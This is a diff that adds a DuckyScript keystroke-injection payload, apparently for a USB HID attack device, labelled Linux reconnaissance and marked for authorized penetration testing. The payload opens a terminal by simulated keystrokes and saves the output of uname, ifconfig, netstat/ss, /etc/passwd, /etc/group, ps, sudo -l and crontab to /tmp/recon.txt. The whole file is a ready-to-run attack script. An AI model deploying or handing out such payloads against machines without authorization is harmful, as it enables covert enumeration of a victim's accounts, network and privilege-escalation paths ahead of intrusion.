@@ -1,0 +1,107 @@
+REM Title: Linux Quick Reconnaissance
+REM Author: David Osisek (CamoZeroDay)
+REM Target: Ubuntu/Debian/RHEL
+REM Version: 1.0
+REM Category: Reconnaissance
+REM
+REM ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY
+REM Fast Linux system enumeration
+
+DELAY 1000
+
+REM Open Terminal
+CTRL-ALT t
+DELAY 1000
+
+REM Output file
+STRING echo '=== LINUX SYSTEM RECON ===' > /tmp/recon.txt
+ENTER
+STRING echo "Date: $(date)" >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM System Info
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== SYSTEM INFO ===' >> /tmp/recon.txt
+ENTER
+STRING uname -a >> /tmp/recon.txt
+ENTER
+STRING cat /etc/*release >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM Network
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== NETWORK ===' >> /tmp/recon.txt
+ENTER
+STRING ifconfig >> /tmp/recon.txt 2>&1
+ENTER
+STRING ip a >> /tmp/recon.txt 2>&1
+ENTER
+DELAY 500
+
+REM Connections
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== CONNECTIONS ===' >> /tmp/recon.txt
+ENTER
+STRING netstat -tulpn >> /tmp/recon.txt 2>&1
+ENTER
+STRING ss -tulpn >> /tmp/recon.txt 2>&1
+ENTER
+DELAY 500
+
+REM Users
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== USERS ===' >> /tmp/recon.txt
+ENTER
+STRING cat /etc/passwd >> /tmp/recon.txt
+ENTER
+STRING w >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM Groups
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== GROUPS ===' >> /tmp/recon.txt
+ENTER
+STRING cat /etc/group >> /tmp/recon.txt
+ENTER
+DELAY 500
+
+REM Processes
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== PROCESSES ===' >> /tmp/recon.txt
+ENTER
+STRING ps aux >> /tmp/recon.txt
+ENTER
+DELAY 1000
+
+REM Sudo Access
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== SUDO RIGHTS ===' >> /tmp/recon.txt
+ENTER
+STRING sudo -l >> /tmp/recon.txt 2>&1
+ENTER
+DELAY 500
+
+REM Cron Jobs
+STRING echo '' >> /tmp/recon.txt
+ENTER
+STRING echo '=== CRON JOBS ===' >> /tmp/recon.txt
+ENTER
+STRING crontab -l >> /tmp/recon.txt 2>&1
+ENTER
+STRING cat /etc/crontab >> /tmp/recon.txt 2>&1
+ENTER
+DELAY 500
+
+REM Exit
+STRING exit
+ENTER
